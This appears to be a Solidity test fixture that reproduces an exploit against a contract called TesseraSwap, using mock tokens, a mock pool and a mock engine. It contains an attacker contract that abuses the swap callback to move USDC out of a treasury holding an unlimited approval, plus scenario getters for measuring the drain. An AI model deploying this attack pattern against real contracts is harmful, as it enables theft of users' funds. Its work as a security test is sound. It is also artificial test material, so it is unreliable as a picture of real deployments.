// Deterministic fixture around the verified TesseraSwap contract.
pragma solidity ^0.8.19;
import "./TesseraSwap.sol";

contract MockERC20 {
 string public name; string public symbol; uint8 public decimals=18; uint256 public totalSupply;
 mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
 constructor(string memory n,string memory s){name=n;symbol=s;}
 function mint(address to,uint256 a) external {balanceOf[to]+=a; totalSupply+=a;}
 function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"bal");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
 function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
 function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a,"bal");require(allowance[f][msg.sender]>=a,"allow");if(allowance[f][msg.sender]!=type(uint256).max)allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}
contract MockEngine is ITesseraEngine {uint256 public inAmount=1 ether; uint256 public outAmount=2 ether; function swapAmount(address,address,int256,address,bytes calldata) external view returns(uint256,uint256){return(inAmount,outAmount);} function swapAmountView(address,address,int256,address) external view returns(uint256,uint256){return(inAmount,outAmount);}}
contract MockPool {
 MockERC20 public weth; MockERC20 public usdc; constructor(address w,address u){weth=MockERC20(w);usdc=MockERC20(u);}
 function swap(address to,uint256 wethOut,uint256 usdcIn) external {uint256 cost=usdcIn/2; require(usdc.transferFrom(msg.sender,address(this),cost),"in");require(weth.transfer(to,wethOut),"out");}
}
contract TesseraAttacker is ITesseraSwapCallback {
 TesseraSwap public target; MockPool public pool; MockERC20 public weth; MockERC20 public usdc; address public receiver;
 constructor(address t,address p,address w,address u,address r){target=TesseraSwap(t);pool=MockPool(p);weth=MockERC20(w);usdc=MockERC20(u);receiver=r;}
 function run() external {target.tesseraSwapWithCallback(address(weth),address(usdc),int256(1 ether),0,address(this),bytes(""),bytes("")); uint256 p=usdc.balanceOf(address(this)); usdc.transfer(receiver,p);}
 function tesseraSwapCallback(int256 amountIn,int256 amountOut,bytes calldata) external {require(msg.sender==address(target)); require(amountIn>0 && amountOut<0); usdc.approve(address(pool),uint256(-amountOut)); pool.swap(address(this),uint256(amountIn),uint256(-amountOut)); weth.transfer(address(target),uint256(amountIn));}
}
contract Scenario {
 MockERC20 public weth; MockERC20 public usdc; MockEngine public engine; MockPool public pool; TesseraSwap public tessera; address public treasury;
 uint256 public constant SEED=100 ether;
 constructor(){weth=new MockERC20("Wrapped Ether","WETH");usdc=new MockERC20("USD Coin","USDC");engine=new MockEngine();pool=new MockPool(address(weth),address(usdc));treasury=address(this);tessera=new TesseraSwap(address(engine),treasury,address(this)); usdc.mint(address(this),SEED); weth.mint(address(pool),SEED); usdc.approve(address(tessera),type(uint256).max);}
 function attack(address receiver) external {TesseraAttacker a=new TesseraAttacker(address(tessera),address(pool),address(weth),address(usdc),receiver); a.run();}
 function asset() external view returns(address){return address(usdc);} function reserveBalance() external view returns(uint256){return usdc.balanceOf(treasury);} function attackerBalance(address a) external view returns(uint256){return usdc.balanceOf(a);}
}
